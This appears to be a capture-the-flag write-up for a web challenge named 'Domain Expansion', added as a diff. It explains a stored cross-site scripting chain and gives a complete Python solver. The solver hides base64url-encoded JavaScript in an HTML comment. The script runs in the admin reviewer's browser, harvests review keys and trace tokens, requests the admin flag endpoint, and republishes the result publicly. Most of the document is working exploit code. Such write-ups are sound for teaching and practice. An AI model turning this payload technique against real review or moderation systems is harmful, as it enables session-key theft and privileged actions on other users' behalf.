@@ -1,0 +1,210 @@
+7) Domain Expansion (web)
+
+I started by reading the handout and tracing the review flow instead of treating it like a normal reflected or stored XSS challenge.
+The important part was noticing that submitted content was not only sanitized and previewed, but also passed through a special reviewer path built around the custom domain-expansion element.
+
+From there, the key observation was that the review process could reach the legacy preview chain, which loaded extra assets through the relay logic and also extracted a hidden module from the HTML comment in the form DE-MODULE.
+That meant the goal was not to inject obvious script tags, but to build a payload that would survive into the reviewer flow and make the admin browser execute attacker-controlled JavaScript from that hidden module mechanism.
+I created a campaign containing a domain-expansion element with a crafted blueprint that forced the legacy pulse/relay path to load during review.
+Inside the campaign body, I also included a DE-MODULE comment containing base64url-encoded JavaScript. When the admin reviewed the campaign, that module executed in the privileged review context.
+
+The script then collected the values exposed in the review flow, including the review key, frame key, ward, asset id, and trace token.
+Using those values, it requested the cascade endpoint to obtain the temporary flag grant.
+After that, it computed the expected proof as a SHA-256 over the grant, trace token, and ward, then used the result to call the admin flag endpoint.
+
+Once the flag was returned, the payload stored it back into a new campaign so it became visible from the normal public campaign listing.
+Finally, I just polled the campaigns endpoint until the flag appeared and recovered CTFAC{88fb04fe9a41b986c1f355eec8a78277e68dda8d4acf82c493fe6f0dc189abb6}.
+
+So the solve was basically a reviewer-path JavaScript execution bug through the DE-MODULE mechanism, followed by using the intended internal review APIs to derive the correct proof and request the flag.
+I used scirpt:
+
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+import re
+import time
+from typing import Optional
+
+import requests
+
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+
+def make_blueprint() -> str:
+    shell = '<section class="legacy-card" data-bundle="legacy:pulse" data-seal="eyJraW5kIjoicmVsYXkiLCJzbG90Ijoic2VsZiJ9"><div class="legacy-topline">Inherited Barrier Sutra</div><h3>{{label}}</h3><p class="legacy-domain">{{domain}}</p></section>'
+    blueprint = {"shell": shell}
+    return b64url(json.dumps(blueprint, separators=(",", ":")).encode())
+
+
+def make_module() -> str:
+    js = r'''
+(async () => {
+  try {
+    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+    const reviewKey = top.document.querySelector('meta[name="review-key"]')?.content || "";
+    const frameKey = document.querySelector('meta[name="frame-key"]')?.content || "";
+    const state = globalThis.__relayState || {};
+    const assetId = state.assetId || document.body.dataset.reviewAssetId || "";
+    const ward = state.ward || "";
+    const traceToken = state.traceToken || "";
+
+    if (!reviewKey || !frameKey || !assetId || !ward || !traceToken) {
+      return;
+    }
+
+    const cascadeResp = await fetch(`/api/review/cascade/${assetId}`, {
+      credentials: "same-origin",
+      headers: {
+        "X-Review-Key": reviewKey,
+        "X-Frame-Key": frameKey,
+        "X-Ward": ward,
+      },
+    });
+    if (!cascadeResp.ok) {
+      return;
+    }
+
+    const cascade = await cascadeResp.json();
+    const flagGrant = cascade.flagGrant || "";
+    if (!flagGrant) {
+      return;
+    }
+
+    const enc = new TextEncoder();
+    const digest = await crypto.subtle.digest(
+      "SHA-256",
+      enc.encode(`${flagGrant}:${traceToken}:${ward}`)
+    );
+    const flagProof = [...new Uint8Array(digest)]
+      .map((b) => b.toString(16).padStart(2, "0"))
+      .join("");
+
+    const flagResp = await fetch(`/api/admin/flag`, {
+      credentials: "same-origin",
+      headers: {
+        "X-Review-Key": reviewKey,
+        "X-Flag-Grant": flagGrant,
+        "X-Asset-Id": assetId,
+        "X-Frame-Key": frameKey,
+        "X-Trace-Token": traceToken,
+        "X-Flag-Proof": flagProof,
+      },
+    });
+    if (!flagResp.ok) {
+      return;
+    }
+
+    const flagJson = await flagResp.json();
+    const flag = flagJson.flag || "";
+    if (!flag) {
+      return;
+    }
+
+    await fetch(`/api/campaigns`, {
+      method: "POST",
+      credentials: "same-origin",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        title: "flag-" + Date.now(),
+        strapline: flag,
+        body: `<section class="stack"><h3>${flag}</h3><p>${flag}</p></section>`,
+      }),
+    });
+
+    await sleep(250);
+  } catch {}
+})();
+'''
+    return b64url(js.encode())
+
+
+def build_body() -> str:
+    blueprint = make_blueprint()
+    module = make_module()
+    return f'''<section class="stack">
+  <h3>Veil rehearsal</h3>
+  <p>Preview copy for the next barrier cutover.</p>
+  <domain-expansion
+    label="veil-rehearsal"
+    domain="veil-rehearsal.barrier-zone.test"
+    data-blueprint="{blueprint}"
+  ></domain-expansion>
+  <!-- DE-MODULE:{module} -->
+</section>'''
+
+
+def create_campaign(base: str, session: requests.Session) -> str:
+    payload = {
+        "title": "Domain Expansion",
+        "strapline": "review path test",
+        "body": build_body(),
+    }
+    r = session.post(f"{base}/api/campaigns", json=payload, timeout=15)
+    r.raise_for_status()
+    return r.json()["id"]
+
+
+def report_campaign(base: str, session: requests.Session, cid: str) -> None:
+    r = session.post(f"{base}/api/report", json={"id": cid}, timeout=15)
+    r.raise_for_status()
+
+
+def poll_flag(base: str, session: requests.Session, timeout_s: int = 25) -> Optional[str]:
+    deadline = time.time() + timeout_s
+    pat = re.compile(r"CTFAC\{[0-9a-fA-F]{64}\}")
+    while time.time() < deadline:
+        r = session.get(f"{base}/api/campaigns", timeout=15)
+        r.raise_for_status()
+        items = r.json().get("items", [])
+        for item in items:
+            text = f'{item.get("title","")} {item.get("strapline","")}'
+            m = pat.search(text)
+            if m:
+                return m.group(0)
+
+            cid = item.get("id")
+            if cid:
+                r2 = session.get(f"{base}/api/campaigns/{cid}", timeout=15)
+                if r2.ok:
+                    body = r2.text
+                    m = pat.search(body)
+                    if m:
+                        return m.group(0)
+        time.sleep(1.2)
+    return None
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("base", help="base url, e.g. http://92049debbe566ca5.ctf.ac.upt.ro")
+    args = ap.parse_args()
+
+    base = args.base.rstrip("/")
+    session = requests.Session()
+
+    try:
+        cid = create_campaign(base, session)
+        print(f"[+] created campaign: {cid}")
+        report_campaign(base, session, cid)
+        print("[+] report queued")
+        flag = poll_flag(base, session)
+        if flag:
+            print(f"[+] FLAG: {flag}")
+            return 0
+
+        print("[-] no flag found yet")
+        print("[*] check /api/campaigns manually and rerun if needed")
+        return 1
+    except Exception as e:
+        print(f"[-] error: {e}")
+        return 1
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
